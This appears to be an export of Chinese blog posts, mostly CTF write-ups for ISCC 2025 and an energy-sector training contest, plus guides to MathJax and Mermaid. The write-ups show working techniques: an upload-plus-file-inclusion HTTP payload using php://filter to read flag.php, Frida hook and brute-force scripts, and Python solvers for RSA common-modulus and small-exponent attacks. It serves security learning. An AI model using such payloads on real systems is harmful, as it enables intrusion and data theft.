[{"title":"ISCC2025线上初赛-WriteUp","url":"/posts/a6b7/","content":"Web战胜卞相壹其实感觉有点脑洞这道题，我们先了解一下卞相壹：在搜索的同时开一个文件扫描，扫一下：出题人不算严谨，Dockerfile和docker-compose.yml都一并打包并没有删除。但是都没有什么信息，我们主要看robots.txt这题脑洞的地方来了：很好，花花肠子不少\n\n在前端有提示2=0这里flag的0也要换成2：import requestsurl = &quot;http://112.126.73.173:49100/f12g.txt&quot;print(requests.get(url).text.replace(&#x27;0&#x27;, &#x27;2&#x27;))\n纸嫁衣6外传查看Dockerfile文件根据Dockerfile文件的内容可知，其启用了Apache rewrite模块，也就是说支持无.php后缀并且配置了AllowOverride。我们此时先看首页内容，其提示我们includes/这个目录下会有文件于是:dirsearch -u http://112.126.73.173:49102/includes/提示回到最初的镜子前，使用Get提交一个锤子。使用chuizi=xx，页面内容改变一个文件包含，但是有点抽象\n\n写文件包含内容：POST /upload HTTP/1.1Host: 112.126.73.173:49102Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryK0a3AmPUU2iVg3BwUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Cache-Control: max-age=0Origin: http://112.126.73.173:49102Referer: http://112.126.73.173:49102/uploadAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Content-Length: 206  ------WebKitFormBoundaryK0a3AmPUU2iVg3BwContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xixi.txt&quot;Content-Type: text/plain  &lt;?php highlight_file(&quot;php://filter/convert.base64-encode/resource=/var/www/html/includes/flag.php&quot;);?&gt;------WebKitFormBoundaryK0a3AmPUU2iVg3Bw--执行后获得回显GET /?chuizi=uploads/xixi.txt HTTP/1.1Host: 112.126.73.173:49102Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9\nHTTP/1.1 200 OKDate: Sat, 03 May 2025 07:58:29 GMTServer: Apache/2.4.62 (Debian)X-Powered-By: PHP/8.1.32Vary: Accept-EncodingContent-Type: text/html; charset=UTF-8Content-Length: 4459  &lt;code  &gt;&lt;span style=&quot;color: #000000&quot;&gt;    &lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php &lt;br /&gt;$ending&amp;nbsp;&lt;/span    &gt;&lt;span style=&quot;color: #007700&quot;&gt;=&amp;nbsp;&lt;/span    &gt;&lt;span style=&quot;color: #DD0000&quot;      &gt;&quot;奚月遥传过来的神器相当有用！肖驰成功通过它逃了出来！二人相拥时，肖驰激动地对奚月遥说：SVNDQ3tXM2xjMG0zX3QwX3BsQHlfWmgxSjFAWTF9&quot;&lt;/span    &gt;&lt;span style=&quot;color: #007700&quot;&gt;; &lt;br /&gt;&lt;/span    &gt;&lt;span style=&quot;color: #0000BB&quot;&gt;?&amp;gt; &lt;br /&gt;&lt;/span&gt;    &lt;br /&gt;&amp;lt;!DOCTYPE&amp;nbsp;html&amp;gt; &lt;br /&gt;&amp;lt;html&amp;nbsp;lang=&quot;zh-CN&quot;&amp;gt;    &lt;br /&gt;&amp;lt;head&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;meta&amp;nbsp;charset=&quot;UTF-8&quot;&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;title&amp;gt;镜花水月&amp;lt;/title&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;style&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;body&amp;nbsp;&#123;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;background-color:&amp;nbsp;#f7f4f1;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;font-family:&amp;nbsp;&quot;宋体&quot;,&amp;nbsp;serif;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;color:&amp;nbsp;#333;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;text-align:&amp;nbsp;center;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;padding:&amp;nbsp;40px&amp;nbsp;20px;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#125;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;img&amp;nbsp;&#123;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;max-width:&amp;nbsp;80%;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;height:&amp;nbsp;auto;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;margin-top:&amp;nbsp;30px;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;border:&amp;nbsp;1px&amp;nbsp;solid&amp;nbsp;#ccc;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;box-shadow:&amp;nbsp;0&amp;nbsp;0&amp;nbsp;15px&amp;nbsp;rgba(0,&amp;nbsp;0,&amp;nbsp;0,&amp;nbsp;0.3);    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#125;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;.content&amp;nbsp;&#123;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;font-size:&amp;nbsp;18px;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;line-height:&amp;nbsp;1.8em;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;margin-top:&amp;nbsp;30px;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#125;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;h2&amp;nbsp;&#123;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;font-size:&amp;nbsp;24px;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;margin-bottom:&amp;nbsp;10px;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#125;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;.ending&amp;nbsp;&#123;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;margin-top:&amp;nbsp;40px;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;font-weight:&amp;nbsp;bold;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;font-size:&amp;nbsp;18px;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;color:&amp;nbsp;#9a2e2e;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#125;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;/style&amp;gt; &lt;br /&gt;&amp;lt;/head&amp;gt;    &lt;br /&gt;&amp;lt;body&amp;gt;    &lt;br /&gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;h2&amp;gt;镜花水月……&amp;lt;/h2&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;div&amp;nbsp;class=&quot;content&quot;&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;p&amp;gt;奚月遥觉得这里应该有什么才对，为什么会没有呢？&amp;lt;/p&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;p&amp;gt;她忽然想到，她应该回到最初的镜子前，&amp;lt;/p&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;p&amp;gt;也许她该&amp;nbsp;&amp;lt;strong&amp;gt;get&amp;lt;/strong&amp;gt;&amp;nbsp;一把“锤子”，一击打碎它……&amp;lt;/p&amp;gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;/div&amp;gt;    &lt;br /&gt;    &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;img&amp;nbsp;src=&quot;../src/whereIsFlag.jpg&quot;&amp;nbsp;alt=&quot;她想起了什么……&quot;&amp;gt;    &lt;br /&gt;    &lt;br /&gt;&amp;lt;/body&amp;gt; &lt;br /&gt;&amp;lt;/html&amp;gt; &lt;br  /&gt;&lt;/span&gt;&lt;/code&gt;\n\nMisc书法大师图片属性值中有备注文件尾附加foremost分离压缩包密码是L9k8JhGfDsA\nfrom strokes import strokesimport base64text = &quot;生工 石色 太摔 少比 边乙 *****************&quot;pairs = text.split()base = &quot;&quot;for pair in pairs:    # 整合两个16进制字符串并添加前缀 &#x27;0x&#x27;    combined_hex = &#x27;0x&#x27; + hex(strokes(pair)[0])[2:] + hex(strokes(pair)[1])[2:]    combined_str = bytes.fromhex(combined_hex[2:]).decode(&#x27;utf-8&#x27;)    base += combined_str# 将base字符串编码为字节类型，然后进行Base64解码try:    decoded_bytes = base64.b64decode(base.encode(&#x27;utf-8&#x27;))    decoded_text = decoded_bytes.decode(&#x27;utf-8&#x27;)    print(decoded_text)except Exception as e:    print(f&quot;解码过程中出现错误: &#123;e&#125;&quot;)\nReverse我爱看小品# uncompyle6 version 3.9.2# Python bytecode version base 3.8.0 (3413)# Decompiled from: Python 3.10.8 (tags/v3.10.8:aaaf517, Oct 11 2022, 16:50:30) [MSC v.1933 64 bit (AMD64)]# Embedded file name: something.pyimport mypy, yourpy  def something():    print(&quot;  打工奇遇&quot;)    print(&quot;宫室长悬陇水声&quot;)    print(&quot;廷陵刻此侈宠光&quot;)    print(&quot;玉池生肥咽不彻&quot;)    print(&quot;液枯自断仙无分&quot;)    print(&quot;酒醒玉山来映人&quot;)def check():    your_input = input()    if your_input[None[:5]] == &quot;ISCC&#123;&quot; and your_input[-1] == &quot;&#125;&quot;:        print(&quot;Come along, you&#x27;ll find the answer!&quot;)    else:        print(&quot;Flag is wrong!&quot;)  if __name__ == &quot;__main__&quot;:    mypy.myfun()    something()    print(&quot;Please enter flag:&quot;)    check()\nSP下载附件，使用x64dbg动调使用DIE查看，发现UPX壳子。使用x64dbg直接步进到输入flag的位置随便输入一点内容，提示错误右下角返回值有内容000000000079FE18  0000000000B46960  &quot;ISCC&#123;Y#9LpXt!q@2m&#125;&quot;这就是FLAG了，加了壳子，但是UPX是压缩壳，内存没有保护。\nMobile三进制战争安卓逆向，我们使用JEB进行逆向分析。等待JEB处理我们此时先看MainActivity，右键选择MainActivity，点击反编译。这里就是验证逻辑，我们注意mobile02的loadLibrary调用，也就是算法会在一个so库调用。代码的主要逻辑如下：输入 s：\n\n要求 s.length()&gt;13，且 s.startsWith(“ISCC{“)，s.endsWith(“}”)\n取 s5 = s.substring(5,11) （6 字符）要求 s5 == stringFromJNI(“6xY*08”) ←—— JNI1\n取 s3 = s.substring(11, s.length()-1) （中间任意长度）\n取 s2 = stringFromJN1() ←—— JNI0\n计算 s4 = stringFromJNl(s2, s3) ←—— JNI2要求 s4 == “022202010210020220010121000111022220”stringFromJNI(String)（我们叫它 JNI1） 根据参数 &quot;6xY\\*08&quot;，在 native 里返回一个 6 字符串——这正是 flag 的第 6–11 位。\n\nstringFromJN1()（JNI0） 返回一个固定的“密钥”字符串 s2。\nstringFromJNl(String key, String body)（JNI2） 把 s2 当密钥、s3 当“密文”，输出一串数字（“022202…”），与 CHECK2 里写死的常量比对。\n不可能单纯靠 Java 侧看到真实算法，因为关键在 native。写一个frida脚本：// hook.jsJava.perform(function()&#123;  var Main = Java.use(&quot;com.example.mobile02.MainActivity&quot;);  // 拦截 native 方法  Main.stringFromJN1.implementation = function()&#123;    var k = this.stringFromJN1();    console.log(&quot;&gt;&gt;&gt; JNI0 key = &quot; + k);    return k;  &#125;;  Main.stringFromJNI.overload(&#x27;java.lang.String&#x27;).implementation = function(arg)&#123;    var out = this.stringFromJNI(arg);    console.log(&quot;&gt;&gt;&gt; JNI1(&quot; + arg + &quot;) = &quot; + out);    return out;  &#125;;  Main.stringFromJNl.overload(&#x27;java.lang.String&#x27;,&#x27;java.lang.String&#x27;).implementation = function(k, body)&#123;    var out = this.stringFromJNl(k, body);    console.log(&quot;&gt;&gt;&gt; JNI2 decrypt with key=&quot;+k+&quot; body=&quot;+body+&quot; → &quot; + out);    return out;  &#125;;&#125;);AS创建一个带Root的虚拟机：系统需要选择Q x86的Android10.0(Google APIs)将apk安装到模拟器中frida -U -f com.example.mobile02 -l 1.js\n输入框随便输入一点ISCC{xxxxxxxxxxxxxx}捕获到key(JNI2)和JNI1,%#e2re’RTflag是ISCC{%#e2re’RT+S3}我们看”022202010210020220010121000111022220”，这个内容是S3加密后的内容。s3必须是6字符，为什么 s3 必须是 6 字符？你用 body=&quot;YYYYY&quot;（5 字符）得到了 30 位输出目标是 36 位 ⇒ 每多一个 s3 字符，多 6 位输出 ⇒ s3 长度 应该是 6。// brute.jsconst TARGET = &quot;012202000011011000000111001211021001&quot;;const CHARSET = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*()_+-=&quot;;let key;// 先 hook 拿到 keyJava.perform(function()&#123;  const Main = Java.use(&quot;com.example.mobile02.MainActivity&quot;);  // 拦截 stringFromJN1 拿到 key  Main.stringFromJN1.implementation = function()&#123;    key = this.stringFromJN1();    console.log(&quot;[*] key =&quot;, key);    return key;  &#125;;  // 启动一次，让 stringFromJN1 执行，拿到 key  Java.scheduleOnMainThread(()=&gt;&#123;    const activity = Java.use(&quot;com.example.mobile02.MainActivity&quot;).$new();    activity.stringFromJN1();    startBrute();  &#125;);&#125;);function startBrute()&#123;  if(!key)&#123;    console.error(&quot;no key yet&quot;);    return;  &#125;  const Main = Java.use(&quot;com.example.mobile02.MainActivity&quot;);  const inst = Main.$new();  // 生成所有长度6组合（改 charset/长度可控）  let arr = CHARSET.split(&quot;&quot;);  let total = Math.pow(arr.length, 6), count=0;  console.log(`[∗] brute total = $&#123;total&#125;`);  // 6 层循环  for(let i0=0;i0&lt;arr.length;i0++)&#123;    for(let i1=0;i1&lt;arr.length;i1++)&#123;      for(let i2=0;i2&lt;arr.length;i2++)&#123;        for(let i3=0;i3&lt;arr.length;i3++)&#123;          for(let i4=0;i4&lt;arr.length;i4++)&#123;            for(let i5=0;i5&lt;arr.length;i5++)&#123;              let s3 = arr[i0]+arr[i1]+arr[i2]+arr[i3]+arr[i4]+arr[i5];              let out = inst.stringFromJNl(key, s3);              if(out === TARGET)&#123;                console.log(&quot;✅ found s3 =&quot;, s3);                console.log(&quot;✅ FLAG = ISCC&#123;%s%s&#125;&quot;, &quot;%CT&#x27;bb&quot;, s3);                // 退出                return;              &#125;              if(++count % 1000000 === 0)&#123;                console.log(&quot;… tried&quot;, count);              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;  &#125;  console.log(&quot;❌ not found&quot;);&#125;暴力破解后6位得到最终flag。ISCC&#123;%#e2re&#x27;RTS4t(5U&#125;\n","categories":["网络安全","CTF","竞赛"],"tags":["CTF","ISCC"]},{"title":"mathjax语法使用","url":"/posts/64b6/","content":"说明当前博客已启用mathjax语法，可以更方便的书写数学公式。\n示例$$ n = p \\times q $$\nn = p \\times q$$ \\phi(n) = (p-1)(q-1) $$\n\\phi(n) = (p-1)(q-1)$$ 1 &lt; e &lt; \\phi(n) $$$$ \\gcd(e, \\phi(n)) = 1 $$\n1 < e < \\phi(n)\\gcd(e, \\phi(n)) = 1$$ a = b + c^3 $$\na = b + c^3$$ a = b + c^&#123;3+1&#125; $$\na = b + c^{3+1}$$a_b$$\na_b","categories":["Hexo使用"],"tags":["Butterfly","Hexo"]},{"title":"Mermaid流程图使用方法","url":"/posts/ddad/","content":"说明当前博客已经 启用 Mermaid 图表功能，可以直接在 Markdown 中绘制流程图、时序图、状态图、甘特图等可视化内容。\n\n✅ Mermaid 是一个支持用纯文本描述流程的图表语言，非常适合在 Hexo + Obsidian 环境中做技术笔记和架构图展示。\n\n基本语法示例流程图\ngraph TD;\n  A--&gt;B;\n  A--&gt;C;\n  B--&gt;D;\n  C--&gt;D;\n\nflowchart TD\n    A[开始] --&gt; B&#123;条件判断&#125;\n    B --&gt;|是| C[执行操作1]\n    B --&gt;|否| D[执行操作2]\n    C --&gt; E[结束]\n    D --&gt; E\n时序图\nsequenceDiagram\n    participant Alice\n    participant Bob\n    Alice-&gt;&gt;Bob: 你好，Bob！\n    Bob--&gt;&gt;Alice: 你好，Alice！\n状态图stateDiagram-v2\n    [*] --&gt; 初始化\n    初始化 --&gt; 运行中\n    运行中 --&gt; 完成\n    完成 --&gt; [*]\n饼图\npie title 我最喜爱的编程语言\n    &quot;Python&quot; : 45\n    &quot;JavaScript&quot; : 25\n    &quot;Java&quot; : 15\n    &quot;C++&quot; : 10\n    &quot;其他&quot; : 5\n象限图\nquadrantChart\ntitle 促销活动效果分析\nx-axis &quot;低覆盖宣传&quot; --&gt; &quot;高覆盖宣传&quot;\ny-axis &quot;低参与度&quot; --&gt; &quot;高参与度&quot;\nquadrant-1 &quot;明星活动：保持投入&quot;\nquadrant-2 &quot;潜力活动：需加大曝光&quot;\nquadrant-3 &quot;待优化活动：重新评估&quot;\nquadrant-4 &quot;高效活动：可稳健扩张&quot;\n&quot;活动A&quot;: [0.75, 0.85]\n&quot;活动B&quot;: [0.45, 0.70]\n&quot;活动C&quot;: [0.25, 0.40]\n&quot;活动D&quot;: [0.80, 0.35]\n甘特图关键语法解读：\n\ndateFormat：定义日期格式。\nsection**​：将任务分组，如“需求阶段”、“开发阶段”。\n​任务定义​：格式为 任务名称 : [状态, ] 别名, 开始时间, 持续时间。\n状态​：done（已完成），active（进行中），crit（关键任务）。​\n别名​：任务的标识符，可用于后续任务引用，如 after des1表示该任务在 des1之后开始。\n时间​：可以是绝对日期（2024-12-01），也可以是相对时间（after 某任务, 3d）。gantt\n    title 项目开发时间线\n    dateFormat  YYYY-MM-DD\n    section 需求阶段\n        需求分析       :done,    des1, 2024-12-01, 2024-12-07\n        需求评审       :active,  des2, after des1, 3d\n    section 开发阶段\n        技术方案设计   :         des3, after des2, 5d\n        编码实现       :         des4, after des3, 10d\n    section 测试阶段\n        功能测试       :         des5, after des4, 7d\n        上线部署       :         des6, after des5, 2d\n\n\n\n\n类图\n关键语法解读：​\n\n​定义类​：使用 class关键字。类成员可用 {}包裹。\n成员可见性​：+表示公有（Public），-表示私有（Private），#表示受保护（Protected）。\n​类关系​：\n​继承​：&lt;|--（如 Dog继承自 Animal）。\n​组合​：*--（强的拥有关系，部分与整体共存亡）。\n聚合​：o--（弱的拥有关系，部分可独立于整体）。\n关联​：--&gt;（一个类知道另一个类）。\n\n\n\nclassDiagram\n    class Animal &#123;\n        +String name\n        +int age\n        +eat()\n        +sleep()\n    &#125;\n    class Dog &#123;\n        +String breed\n        +bark()\n    &#125;\n    class Cat &#123;\n        +String color\n        +meow()\n    &#125;\n    Animal &lt;|-- Dog\n    Animal &lt;|-- Cat\n实体关系（ER图）\n关键语法解读：​\n\n​定义实体和属性​：实体名称通常首字母大写。属性可以在实体下方的 {}块中定义，PK表示主键（Primary Key）。\n​关系语法​：实体A 基数A--基数B 实体B : &quot;关系描述&quot;。\n\n​基数符号​：表示实体间的数量关系。\n\n||表示“一且只有一个”（恰好一个）。\no|表示“零或一个”。\n}o表示“零或多个”。\n}|表示“一或多个”。\n\n\n例如，CUSTOMER ||--o{ ORDER : &quot;places&quot;表示一个客户（CUSTOMER）可以下多个订单（ORDER）（“零或多个”），而一个订单只属于一个客户（“恰好一个”）。\n\n\n\n\nerDiagram\n    CUSTOMER ||--o&#123; ORDER : &quot;places&quot;\n    ORDER ||--|&#123; ORDER_ITEM : &quot;contains&quot;\n    PRODUCT ||--|&#123; ORDER_ITEM : &quot;included_in&quot;\n\n    CUSTOMER &#123;\n        string customer_id PK\n        string name\n        string email\n    &#125;\n    ORDER &#123;\n        string order_id PK\n        string customer_id FK\n        date order_date\n    &#125;\n    PRODUCT &#123;\n        string product_id PK\n        string product_name\n        decimal price\n    &#125;\n    ORDER_ITEM &#123;\n        string order_id FK\n        string product_id FK\n        int quantity\n    &#125;","categories":["Hexo使用"],"tags":["Butterfly","Hexo"]},{"title":"2025某能源行业培训测验赛事题目WP","url":"/posts/772/","content":"Crypto共模之谜题目名称：共模之谜题目描述：情报部门截获了两条来自同一来源的加密信息，它们使用了相同的RSA模数但不同的公钥指数。这种看似冗余的操作背后可能隐藏着严重的安全隐患。你能利用这一漏洞还原出原始情报吗？\n题目给出了如下数据：n =  52434676028442864513479128215013580182283012674942942342267825274916668125023466810480258585751372421292748168448504340890831865866538692974717102950393572887019518607310927816328323922713991044821625309344713196448648512424001395920800511116740568322697525090524941927457199617152790810652838307470708198191e1 =  65535e2 =  65537c1 =  31521924348336802941777804619118889419878299906419071463959824967144080278171748396111541024836589397246436103266770875084999045862006933555188252327690337535968633887854737591285586725332567987630507078395008745655466830366884621022676739454737019137093537940861470289530663521973352477282432379221618425173c2 =  36458358677472463740424671249382188611575270134299259491605236563200229724936493457180763895249374203908007428278380931503316461352600040412306743430776089418505336838252318935614227276154885340185203325582856170342370595170507594127231199036370588508651117489152775119699195183906973863975443599121572830617提示：当同一明文 m在相同的模数 n下被两个互质的公钥指数 e1,e2加密时，攻击者可通过扩展欧几里得算法找到一组整数 s,t满足 s⋅e1+t⋅e2=1，进而直接计算 m\n实际上这就是共模攻击。\nimport gmpy2from Crypto.Util.number import long_to_bytes  n = 52434676028442864513479128215013580182283012674942942342267825274916668125023466810480258585751372421292748168448504340890831865866538692974717102950393572887019518607310927816328323922713991044821625309344713196448648512424001395920800511116740568322697525090524941927457199617152790810652838307470708198191e1 = 65535e2 = 65537c1 = 31521924348336802941777804619118889419878299906419071463959824967144080278171748396111541024836589397246436103266770875084999045862006933555188252327690337535968633887854737591285586725332567987630507078395008745655466830366884621022676739454737019137093537940861470289530663521973352477282432379221618425173c2 = 36458358677472463740424671249382188611575270134299259491605236563200229724936493457180763895249374203908007428278380931503316461352600040412306743430776089418505336838252318935614227276154885340185203325582856170342370595170507594127231199036370588508651117489152775119699195183906973863975443599121572830617  g, s1, s2 = gmpy2.gcdext(e1, e2)assert g == 1, &quot;e1 and e2 不互质&quot;if s1 &lt; 0:    c1 = gmpy2.invert(c1, n)    s1 = -s1if s2 &lt; 0:    c2 = gmpy2.invert(c2, n)    s2 = -s2m_part1 = pow(c1, s1, n)m_part2 = pow(c2, s2, n)m = (m_part1 * m_part2) % nprint(&quot;结果&quot;,long_to_bytes(m).decode())\nflag{528d82e8ad37e7aeca4c60d475dc056b}\n三次方的陷阱题目名称：三次方的陷阱题目描述：在一次网络取证中，你发现攻击者留下了一条RSA加密的密文。据情报显示，加密者为了提升效率，使用了一个极小的公钥指数。然而，这种优化反而引入了致命漏洞。你能利用这一点还原出原始信息吗？\n题目给出了如下数据：n:121383870071311775359911942411789216597716521631089762926488206150018405982242606657064334331128377877618291611912838143522718043048975642123842910378536861304156503028830728263614462484834569011277782682653550833803057515742235247213351034112654400245411355170987970439052312230073603288646796930218863851531e:3c:2217344750798710450802454256530905633991914822718944829361939093715780428997238569636656782796294509135735606047120598053449689542122515721333911857696093436383317783079856772999993481426122938079821372867463989809098932628954263602024896175828059384261351520201111250580837\n当 e=3且明文 m较短时（即 m^3&lt;n），密文 c=m ^e mod n可能直接等于 m^3（未模 n溢出）。此时可直接对 c开三次方根得到 m。计算 c的立方根（如使用 Python 的 gmpy2.iroot）,将得到的整数 m转换为字节串，即还原明文 flag\n实际上就是低加密指数攻击：def integer_nth_root(a,n):    low = 0    high = 1 &lt;&lt; ((a.bit_length() + n -1) // n+1)    while low + 1 &lt; high:        mid = (low+high) // 2        mid_n = pow(mid,n)        if mid_n == a:            return mid, True        if mid_n &lt; a:            low = mid        else:            high = mid    return low, pow(low, n) == adef int_to_bytes(i):    if i == 0:        return b&quot;\\x00&quot;    blen = (i.bit_length() +7) // 8    return i.to_bytes(blen, byteorder=&#x27;big&#x27;)n = 12138387***e = 3c = 221734475079871***m_root, exact = integer_nth_root(c, e)if exact:    m_bytes = int_to_bytes(m_root)    try:        print(&quot;明文&quot;,m_bytes.decode())    except Exception:        print(&quot;只能以十六进制展示&quot;,m_bytes.hex)else:    